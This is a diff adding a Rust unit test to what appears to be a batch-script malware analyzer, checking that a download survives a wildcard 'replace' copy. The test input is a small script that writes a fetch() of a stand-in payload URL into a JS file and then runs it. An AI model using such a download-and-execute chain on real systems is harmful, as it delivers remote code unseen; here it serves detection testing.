@@ -10358,6 +10358,23 @@ call C:/Temp/original.js"#,
     }
 
     #[test]
+    fn replace_wildcard_source_preserves_generated_script_content() {
+        let report = analyze(
+            br#"echo fetch('https://replace-wildcard-dir.example/payload') > C:\Work\original.js
+replace C:\Work\*.js C:\Temp
+call C:\Temp\original.js"#,
+            &Config::default(),
+        );
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(t, Trait::Download { src, .. } if src == "https://replace-wildcard-dir.example/payload")
+            }),
+            "replace wildcard source copied generated JS content was not analyzed: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
     fn replace_current_dir_source_preserves_tracked_content() {
         let mut env = Environment::new(&Config::default());
         env.modified_filesystem.insert(
